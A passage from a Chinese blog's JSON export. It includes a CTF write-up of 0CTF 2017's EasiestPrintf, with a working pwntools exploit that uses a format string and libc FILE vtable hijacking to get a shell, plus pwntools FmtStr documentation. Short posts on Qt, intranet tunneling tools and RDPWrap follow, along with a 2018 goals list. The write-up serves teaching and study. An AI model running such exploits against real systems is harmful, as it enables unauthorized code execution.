class=\"keyword\">push</span>   <span class=\"built_in\">esi</span></div><div class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│   <span class=\"number\">0xf771d978</span> (_IO_file_jumps+<span class=\"number\">24</span>) —▸ <span class=\"number\">0xf75d8b50</span> (_IO_default_pbackfail) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">07</span>:001c│   <span class=\"number\">0xf771d97c</span> (_IO_file_jumps+<span class=\"number\">28</span>) —▸ <span class=\"number\">0xf75d5c50</span> (_IO_file_xsputn) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│   <span class=\"number\">0xf771d980</span> (_IO_file_jumps+<span class=\"number\">32</span>) —▸ <span class=\"number\">0xf75d5790</span> ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0024</span>│   <span class=\"number\">0xf771d984</span> (_IO_file_jumps+<span class=\"number\">36</span>) —▸ <span class=\"number\">0xf75d4730</span> (_IO_file_seekoff) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\">0a:<span class=\"number\">0028</span>│   <span class=\"number\">0xf771d988</span> (_IO_file_jumps+<span class=\"number\">40</span>) —▸ <span class=\"number\">0xf75d7dd0</span> ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">0b</span>:002c│   <span class=\"number\">0xf771d98c</span> (_IO_file_jumps+<span class=\"number\">44</span>) —▸ <span class=\"number\">0xf75d44b0</span> (_IO_file_setbuf) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">esi</span></div><div class=\"line\">0c:<span class=\"number\">0030</span>│   <span class=\"number\">0xf771d990</span> (_IO_file_jumps+<span class=\"number\">48</span>) —▸ <span class=\"number\">0xf75d4300</span> (_IO_file_sync) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">0d</span>:<span class=\"number\">0034</span>│   <span class=\"number\">0xf771d994</span> (_IO_file_jumps+<span class=\"number\">52</span>) —▸ <span class=\"number\">0xf75c93b0</span> (_IO_file_doallocate) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\">0e:<span class=\"number\">0038</span>│   <span class=\"number\">0xf771d998</span> (_IO_file_jumps+<span class=\"number\">56</span>) —▸ <span class=\"number\">0xf75d5c00</span> (_IO_file_read) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">esi</span></div><div class=\"line\">0f:003c│   <span class=\"number\">0xf771d99c</span> (_IO_file_jumps+<span class=\"number\">60</span>) —▸ <span class=\"number\">0xf75d55b0</span> (_IO_file_write) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebp</span></div><div class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│   <span class=\"number\">0xf771d9a0</span> (_IO_file_jumps+<span class=\"number\">64</span>) —▸ <span class=\"number\">0xf75d5210</span> (_IO_file_seek) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebx</span></div><div class=\"line\"><span class=\"number\">11</span>:<span class=\"number\">0044</span>│   <span class=\"number\">0xf771d9a4</span> (_IO_file_jumps+<span class=\"number\">68</span>) —▸ <span class=\"number\">0xf75d4480</span> (_IO_file_close) ◂— <span class=\"keyword\">push</span>   <span class=\"built_in\">ebx</span></div><div class=\"line\"><span class=\"number\">12</span>:<span class=\"number\">0048</span>│   <span class=\"number\">0xf771d9a8</span> (_IO_file_jumps+<span class=\"number\">72</span>) —▸ <span class=\"number\">0xf75d5590</span> (_IO_file_stat) ◂— <span class=\"keyword\">sub</span>    <span class=\"built_in\">esp</span>, <span class=\"number\">0x10</span></div><div class=\"line\"><span class=\"number\">13</span>:004c│   <span class=\"number\">0xf771d9ac</span> (_IO_file_jumps+<span class=\"number\">76</span>) —▸ <span class=\"number\">0xf75d8ce0</span> ◂— <span class=\"keyword\">mov</span>    <span class=\"built_in\">eax</span>, <span class=\"number\">0xffffffff</span></div><div class=\"line\"><span class=\"number\">14</span>:<span class=\"number\">0050</span>│   <span class=\"number\">0xf771d9b0</span> (_IO_file_jumps+<span class=\"number\">80</span>) —▸ <span class=\"number\">0xf75d8cf0</span> ◂— <span class=\"keyword\">ret</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"利用原理\"><a href=\"#利用原理\" class=\"headerlink\" title=\"利用原理\"></a>利用原理</h2><p>我们平时调用文件族的函数的时候（包括一些输入输出），最后都会通过虚表来调用函数，如果我们可以通过修改<code>signed char _vtable_offset</code>使其指向一个我们伪造的虚表，那么我们就可以控制eip。</p>\n<p>利用思路：</p>\n<ol>\n<li>控制<code>_IO_FILE_plus</code>或<code>_IO_FILE</code>结构体的<code>signed char _vtable_offset</code>偏移使其指向我们伪造的虚表。</li>\n<li>伪造虚表中函数为我们希望程序调用的函数如<code>system</code></li>\n</ol>\n<p>利用条件：</p>\n<ol>\n<li>可泄露<code>libc</code>基址</li>\n<li>有一次任意地址写的机会</li>\n<li>存在一个我们知道地址的可控区域</li>\n</ol>\n<h2 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h2><p>下面用20170ctf的Easyprintf来为例分析</p>\n<blockquote>\n<p>程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的<code>_IO_2_1_stdout_</code>结构的虚表，因为<code>printf</code>在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为<code>system</code>，而这个结构自身会作为参数传入，覆盖虚表之后将一个<code>sh\\0\\0</code>写到整个结构头部即可。</p>\n</blockquote>\n<p>先放上没什么卵用但是应该是对的并且学到了东西的exp。。。。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\">local = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> local:</div><div class=\"line\">    p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> local <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, open(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\">bss_addr = elf.bss</div><div class=\"line\">_IO_stdout_got = <span class=\"number\">0x0804A044</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\">def exe_fmt(payload):</div><div class=\"line\">    p = process('./EasiestPrintf')</div><div class=\"line\">    p.recvuntil('read:\\n')</div><div class=\"line\">    p.sendline(str(_IO_stdout_addr))</div><div class=\"line\">    p.recvuntil('Good Bye\\n')</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    return p.recvall()</div><div class=\"line\">'''</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'read:\\n'</span>)</div><div class=\"line\">    p.sendline(str(_IO_stdout_got))</div><div class=\"line\">    _IO_stdout_addr = int(p.recvline(), <span class=\"number\">16</span>)</div><div class=\"line\">    p.recvline(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'_IO_stdout_addr =&gt; '</span>, hex(_IO_stdout_addr)</div><div class=\"line\">    libc.address = _IO_stdout_addr - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\">    _IO_file_jumps_addr = libc.symbols[<span class=\"string\">'_IO_file_jumps'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'_IO_file_jumps =&gt; '</span>, hex(libc.symbols[<span class=\"string\">'_IO_file_jumps'</span>])</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    </div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exe_fmt</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">        p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'read:\\n'</span>)</div><div class=\"line\">        p.sendline(str(_IO_stdout_got))</div><div class=\"line\">        p.recvuntil(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\">        p.sendline(payload)</div><div class=\"line\">        <span class=\"keyword\">return</span> p.recvall()</div><div class=\"line\">    fmt = FmtStr(exe_fmt)  <span class=\"comment\"># init</span></div><div class=\"line\">    <span class=\"comment\"># _IO_stdout_addr = 'sh\\x00\\x00'</span></div><div class=\"line\">    <span class=\"comment\"># _IO_stdout_addr - 4 = &amp;system</span></div><div class=\"line\">    <span class=\"comment\"># _IO_stdout_vtable+0x1c = &amp;(libc_stdout-4)       _IO_file_xsputn</span></div><div class=\"line\">    writes = &#123;_IO_stdout_addr:<span class=\"number\">26739</span><span class=\"number\">-16</span>, <span class=\"comment\"># 'sh\\x00\\x00'</span></div><div class=\"line\">            _IO_stdout_addr<span class=\"number\">-4</span>:system_addr,</div><div class=\"line\">            _IO_file_jumps_addr+<span class=\"number\">0x1c</span>:_IO_stdout_addr<span class=\"number\">-4</span>&#125;</div><div class=\"line\">    payload = fmtstr_payload(fmt.offset, writes, <span class=\"number\">0</span>, <span class=\"string\">'byte'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    </div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<p>最后的payload使180长度，但是最大长度是158- -。。</p>\n<h2 id=\"关于FmtStr\"><a href=\"#关于FmtStr\" class=\"headerlink\" title=\"关于FmtStr\"></a>关于FmtStr</h2><p>pwntools中的fmtstr还是很有趣的，唯一的不足就是生成的payload太长了- -因为据观察完全是用<code>hhn</code>来修改的（因为只能指定一个只能为<code>hhn</code>or<code>hn</code>or<code>n</code>中的一种来生成payload），大概是作者懒了没想设计别的算法把- -</p>\n<p>先看下给出的example<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>program = tempfile.mktemp()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>source  = program + <span class=\"string\">\".c\"</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>write(source, <span class=\"string\">'''</span></div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;stdio.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;stdlib.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;unistd.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#include &lt;sys/mman.h&gt;</div><div class=\"line\"><span class=\"meta\">... </span>#define MEMORY_ADDRESS ((void*)0x11111000)</div><div class=\"line\"><span class=\"meta\">... </span>#define MEMORY_SIZE 1024</div><div class=\"line\"><span class=\"meta\">... </span>#define TARGET ((int *) 0x11111110)</div><div class=\"line\"><span class=\"meta\">... </span>int main(int argc, char const *argv[])</div><div class=\"line\"><span class=\"meta\">... </span>&#123;</div><div class=\"line\"><span class=\"meta\">... </span>       char buff[1024];</div><div class=\"line\"><span class=\"meta\">... </span>       void *ptr = NULL;</div><div class=\"line\"><span class=\"meta\">... </span>       int *my_var = TARGET;</div><div class=\"line\"><span class=\"meta\">... </span>       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</div><div class=\"line\"><span class=\"meta\">... </span>       if(ptr != MEMORY_ADDRESS)</div><div class=\"line\"><span class=\"meta\">... </span>       &#123;</div><div class=\"line\"><span class=\"meta\">... </span>               perror(\"mmap\");</div><div class=\"line\"><span class=\"meta\">... </span>               return EXIT_FAILURE;</div><div class=\"line\"><span class=\"meta\">... </span>       &#125;</div><div class=\"line\"><span class=\"meta\">... </span>       *my_var = 0x41414141;</div><div class=\"line\"><span class=\"meta\">... </span>       write(1, &amp;my_var, sizeof(int *));</div><div class=\"line\"><span class=\"meta\">... </span>       scanf(\"%s\", buff);</div><div class=\"line\"><span class=\"meta\">... </span>       dprintf(2, buff);</div><div class=\"line\"><span class=\"meta\">... </span>       write(1, my_var, sizeof(int));</div><div class=\"line\"><span class=\"meta\">... </span>       return 0;</div><div class=\"line\"><span class=\"meta\">... </span>&#125;''')</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>cmdline = [<span class=\"string\">\"gcc\"</span>, source, <span class=\"string\">\"-Wno-format-security\"</span>, <span class=\"string\">\"-m32\"</span>, <span class=\"string\">\"-o\"</span>, program]</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>process(cmdline).wait_for_close()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exec_fmt</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\"><span class=\"meta\">... </span>    p = process(program)</div><div class=\"line\"><span class=\"meta\">... </span>    p.sendline(payload)</div><div class=\"line\"><span class=\"meta\">... </span>    <span class=\"keyword\">return</span> p.recvall()</div><div class=\"line\">...</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>autofmt = FmtStr(exec_fmt)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>offset = autofmt.offset</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>p = process(program, stderr=PIPE)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>addr = unpack(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>payload = fmtstr_payload(offset, &#123;addr: <span class=\"number\">0x1337babe</span>&#125;)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>p.sendline(payload)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">print</span> hex(unpack(p.recv(<span class=\"number\">4</span>)))</div><div class=\"line\"><span class=\"number\">0x1337babe</span></div></pre></td></tr></table></figure></p>\n<p>主要就是一个类，一个函数：<br><code>class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)</code><br><code>pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;) → str</code></p>\n<p>其中上面的那个类可以用来完成fsb的所有操作，下面那个方法主要是用来产生payload用。</p>\n<ul>\n<li>execute_fmt 一个存在fsb的process，我们通过这个process的交互过程来得到fsb的一些基本信息</li>\n<li>offset 偏移，没有给出的话会通过栈泄露自动给出</li>\n<li>padlen payload之前填充的字符数</li>\n<li>numbwritem 生成的此payload（包括填充）之前的偏移量</li>\n</ul>\n<p>看了看源码，发现<code>成员名</code>和<code>参数名</code>是同名的，直接调用即可。我们其实可以主要用这个来得到<code>FmtStr.offset</code>即可。<br>实例化一个类后，通过<code>write(addr, data)</code>来控制想要修改的地址和数据，可以通过一个字典来传参<strong>（data(int)）</strong>。<br>最后通过<code>execute_writes()</code>方法来调用<code>fmtstr_payload</code>生成payload并发送出去。</p>\n<p>我们也可以直接调用<code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code>这个方法来只生成payload。<br>给下参数，没啥特别的</p>\n<ul>\n<li>offset (int) – the first formatter’s offset you control</li>\n<li>writes (dict) – dict with addr, value {addr: value, addr2: value2}</li>\n<li>numbwritten (int) – number of byte already written by the printf function</li>\n<li>write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)</li>\n</ul>\n"},{"title":"Qt初体验","date":"2017-04-23T12:31:08.000Z","_content":"\n最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。","source":"_posts/Qt初体验.md","raw":"---\ntitle: Qt初体验\ntags:\n  - Qt\n  - C/C++\ncategories: []\ndate: 2017-04-23 20:31:08\n---\n\n最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。","slug":"Qt初体验","published":1,"updated":"2017-04-26T08:38:03.094Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k1r003bhv18ppevb78r","content":"<p>最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。</p>\n","excerpt":"","more":"<p>最近要给辩论赛做个计数器，以前那个丢了，正好来试试Qt的使用。</p>\n"},{"title":"RD+内网穿透","date":"2017-11-08T14:27:02.000Z","_content":"\n## 前言\n\n这个技术在内网渗透中应该是极为常见的，但这次处于比赛的缘故，我不得不学习了起来。另外，之前一白师傅用的vpn内网穿透的方法还需要研究一下，初步猜测是一个有公网ip的vpn+4g网卡。\n\n## 内网穿透\n\n研究了一下，目前开源的方法主要是[ngork](https://github.com/inconshreveable/ngrok)，[frp](https://github.com/fatedier/frp)，[lanproxy](https://github.com/ffay/lanproxy)，最终从配置的便捷性上选择lanproxy。\n\nlanproxy的安装非常简单，下载server和client的release即可，服务器端需要python3和相应的包，client需要java1.8。\n\n## 家庭版win10开启RD\n\n家庭版在win10中阉割了RD，取而代之的是一个叫做**远程协助**的功能。emmmm，对此，在我查到解决方法之前就像吃了苍蝇一样。。。\n\n后来在github上看到了一个解决方案，[rdpwarp](https://github.com/stascorp/rdpwrap)，粗看了一下，应该是把pro版本的RD中的相关ini和exe文件重新安装在了机器上，然后开启了这个服务。但是在使用过称中发现了还有一个叫`rfxvmt.dll`的文件缺失，需要下载并替换[link](https://github.com/stascorp/rdpwrap/issues/194#issuecomment-325627235)，目录是`system32`和`SysWOW64`这两个文件夹。","source":"_posts/RD内网穿透.md","raw":"---\ntitle: RD+内网穿透\ntags:\n  - web\ncategories: []\ndate: 2017-11-08 22:27:02\n---\n\n## 前言\n\n这个技术在内网渗透中应该是极为常见的，但这次处于比赛的缘故，我不得不学习了起来。另外，之前一白师傅用的vpn内网穿透的方法还需要研究一下，初步猜测是一个有公网ip的vpn+4g网卡。\n\n## 内网穿透\n\n研究了一下，目前开源的方法主要是[ngork](https://github.com/inconshreveable/ngrok)，[frp](https://github.com/fatedier/frp)，[lanproxy](https://github.com/ffay/lanproxy)，最终从配置的便捷性上选择lanproxy。\n\nlanproxy的安装非常简单，下载server和client的release即可，服务器端需要python3和相应的包，client需要java1.8。\n\n## 家庭版win10开启RD\n\n家庭版在win10中阉割了RD，取而代之的是一个叫做**远程协助**的功能。emmmm，对此，在我查到解决方法之前就像吃了苍蝇一样。。。\n\n后来在github上看到了一个解决方案，[rdpwarp](https://github.com/stascorp/rdpwrap)，粗看了一下，应该是把pro版本的RD中的相关ini和exe文件重新安装在了机器上，然后开启了这个服务。但是在使用过称中发现了还有一个叫`rfxvmt.dll`的文件缺失，需要下载并替换[link](https://github.com/stascorp/rdpwrap/issues/194#issuecomment-325627235)，目录是`system32`和`SysWOW64`这两个文件夹。","slug":"RD内网穿透","published":1,"updated":"2017-11-08T14:54:02.527Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k1u003dhv18d4vx92mh","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>这个技术在内网渗透中应该是极为常见的，但这次处于比赛的缘故，我不得不学习了起来。另外，之前一白师傅用的vpn内网穿透的方法还需要研究一下，初步猜测是一个有公网ip的vpn+4g网卡。</p>\n<h2 id=\"内网穿透\"><a href=\"#内网穿透\" class=\"headerlink\" title=\"内网穿透\"></a>内网穿透</h2><p>研究了一下，目前开源的方法主要是<a href=\"https://github.com/inconshreveable/ngrok\" target=\"_blank\" rel=\"external\">ngork</a>，<a href=\"https://github.com/fatedier/frp\" target=\"_blank\" rel=\"external\">frp</a>，<a href=\"https://github.com/ffay/lanproxy\" target=\"_blank\" rel=\"external\">lanproxy</a>，最终从配置的便捷性上选择lanproxy。</p>\n<p>lanproxy的安装非常简单，下载server和client的release即可，服务器端需要python3和相应的包，client需要java1.8。</p>\n<h2 id=\"家庭版win10开启RD\"><a href=\"#家庭版win10开启RD\" class=\"headerlink\" title=\"家庭版win10开启RD\"></a>家庭版win10开启RD</h2><p>家庭版在win10中阉割了RD，取而代之的是一个叫做<strong>远程协助</strong>的功能。emmmm，对此，在我查到解决方法之前就像吃了苍蝇一样。。。</p>\n<p>后来在github上看到了一个解决方案，<a href=\"https://github.com/stascorp/rdpwrap\" target=\"_blank\" rel=\"external\">rdpwarp</a>，粗看了一下，应该是把pro版本的RD中的相关ini和exe文件重新安装在了机器上，然后开启了这个服务。但是在使用过称中发现了还有一个叫<code>rfxvmt.dll</code>的文件缺失，需要下载并替换<a href=\"https://github.com/stascorp/rdpwrap/issues/194#issuecomment-325627235\" target=\"_blank\" rel=\"external\">link</a>，目录是<code>system32</code>和<code>SysWOW64</code>这两个文件夹。</p>\n","excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>这个技术在内网渗透中应该是极为常见的，但这次处于比赛的缘故，我不得不学习了起来。另外，之前一白师傅用的vpn内网穿透的方法还需要研究一下，初步猜测是一个有公网ip的vpn+4g网卡。</p>\n<h2 id=\"内网穿透\"><a href=\"#内网穿透\" class=\"headerlink\" title=\"内网穿透\"></a>内网穿透</h2><p>研究了一下，目前开源的方法主要是<a href=\"https://github.com/inconshreveable/ngrok\">ngork</a>，<a href=\"https://github.com/fatedier/frp\">frp</a>，<a href=\"https://github.com/ffay/lanproxy\">lanproxy</a>，最终从配置的便捷性上选择lanproxy。</p>\n<p>lanproxy的安装非常简单，下载server和client的release即可，服务器端需要python3和相应的包，client需要java1.8。</p>\n<h2 id=\"家庭版win10开启RD\"><a href=\"#家庭版win10开启RD\" class=\"headerlink\" title=\"家庭版win10开启RD\"></a>家庭版win10开启RD</h2><p>家庭版在win10中阉割了RD，取而代之的是一个叫做<strong>远程协助</strong>的功能。emmmm，对此，在我查到解决方法之前就像吃了苍蝇一样。。。</p>\n<p>后来在github上看到了一个解决方案，<a href=\"https://github.com/stascorp/rdpwrap\">rdpwarp</a>，粗看了一下，应该是把pro版本的RD中的相关ini和exe文件重新安装在了机器上，然后开启了这个服务。但是在使用过称中发现了还有一个叫<code>rfxvmt.dll</code>的文件缺失，需要下载并替换<a href=\"https://github.com/stascorp/rdpwrap/issues/194#issuecomment-325627235\">link</a>，目录是<code>system32</code>和<code>SysWOW64</code>这两个文件夹。</p>\n"},{"title":"Some Plans in New Year 2018","date":"2018-01-22T03:41:54.000Z","_content":"\n## 2018值得期待的、值得完成的\n\n1. 考上想去的学校\n2. 完成一个有价值的开源项目\n3. 参与一个企业级的项目，并贡献（主要）代码\n4. 得到重量级的国际CTF比赛名次\n5. 得到国内重量级CTF名次、国赛二等奖及以上\n6. 获得CVE编号（中危及以上）\n7. Windows逆向与漏洞基础技能点点满\n8. 实习期间能够成为合格的逆向&漏洞网安从业者、达到江苏二进制顶尖水平、江苏（全国）公安内顶尖水平（V牛那个层次吧。。）\n9. 熟悉Linux Kernal\n10. 努力努力的学好英语QAQ（托福什么的能够拿到100吧）\n11. 和SU一起努力成为国内顶尖战队、国际赛前15战队\n12. 和CST成为国内一线战队（现在的SU）、有入围国内顶尖比赛并获得名次的实力\n13. 每周更新博客2篇\n13. 最后，还是和去年一样，希望能遇到喜欢的妹子XD\n\n**GOOD LUCK TO ME!**","source":"_posts/Some-Plans-in-New-Year-2018.md","raw":"---\ntitle: Some Plans in New Year 2018\ntags:\n  - life\ncategories: []\ndate: 2018-01-22 11:41:54\n---\n\n## 2018值得期待的、值得完成的\n\n1. 考上想去的学校\n2. 完成一个有价值的开源项目\n3. 参与一个企业级的项目，并贡献（主要）代码\n4. 得到重量级的国际CTF比赛名次\n5. 得到国内重量级CTF名次、国赛二等奖及以上\n6. 获得CVE编号（中危及以上）\n7. Windows逆向与漏洞基础技能点点满\n8. 实习期间能够成为合格的逆向&漏洞网安从业者、达到江苏二进制顶尖水平、江苏（全国）公安内顶尖水平（V牛那个层次吧。。）\n9. 熟悉Linux Kernal\n10. 努力努力的学好英语QAQ（托福什么的能够拿到100吧）\n11. 和SU一起努力成为国内顶尖战队、国际赛前15战队\n12. 和CST成为国内一线战队（现在的SU）、有入围国内顶尖比赛并获得名次的实力\n13. 每周更新博客2篇\n13. 最后，还是和去年一样，希望能遇到喜欢的妹子XD\n\n**GOOD LUCK TO ME!**","slug":"Some-Plans-in-New-Year-2018","published":1,"updated":"2018-01-22T05:24:34.700Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k1w003fhv18c9nabmnz","content":"<h2 id=\"2018值得期待的、值得完成的\"><a href=\"#2018值得期待的、值得完成的\" class=\"headerlink\" title=\"2018值得期待的、值得完成的\"></a>2018值得期待的、值得完成的</h2><ol>\n<li>考上想去的学校</li>\n<li>完成一个有价值的开源项目</li>\n<li>参与一个企业级的项目，并贡献（主要）代码</li>\n<li>得到重量级的国际CTF比赛名次</li>\n<li>得到国内重量级CTF名次、国赛二等奖及以上</li>\n<li>获得CVE编号（中危及以上）</li>\n<li>Windows逆向与漏洞基础技能点点满</li>\n<li>实习期间能够成为合格的逆向&amp;漏洞网安从业者、达到江苏二进制顶尖水平、江苏（全国）公安内顶尖水平（V牛那个层次吧。。）</li>\n<li>熟悉Linux Kernal</li>\n<li>努力努力的学好英语QAQ（托福什么的能够拿到100吧）</li>\n<li>和SU一起努力成为国内顶尖战队、国际赛前15战队</li>\n<li>和CST成为国内一线战队（现在的SU）、有入围国内顶尖比赛并获得名次的实力</li>\n<li>每周更新博客2篇</li>\n<li>最后，还是和去年一样，希望能遇到喜欢的妹子XD</li>\n</ol>\n<p><strong>GOOD LUCK TO ME!</strong></p>\n","excerpt":"","more":"<h2 id=\"2018值得期待的、值得完成的\"><a href=\"#2018值得期待的、值得完成的\" class=\"headerlink\" 